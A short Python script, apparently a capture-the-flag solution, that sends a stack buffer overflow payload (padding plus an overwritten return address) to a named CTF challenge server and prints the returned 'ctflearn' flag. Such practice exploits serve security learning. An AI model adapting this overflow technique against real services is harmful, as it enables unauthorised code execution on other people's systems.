#!/usr/bin/env python3

import re
import socket
from struct import pack

def exploit(hostname, port, payload):
  sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  sock.connect((hostname, port))
  sock.sendall(payload)
  sock.shutdown(socket.SHUT_WR)
  response = b''

  while True:
    chunk = sock.recv(1024)
    if chunk == b'':
      break
    response += chunk

  sock.close()
  return response


def is_flag(line):
  return re.match('^ctflearn{', line, re.IGNORECASE)


def main():
  payload = (b'a' * 60) + pack('<I', 0x08048586)

  session = exploit('thekidofarcrania.com', 4902, payload)
  session = session.decode('ascii').splitlines()

  flag = next(line for line in session if is_flag(line))
  print(flag)


if __name__ == '__main__':
  main()
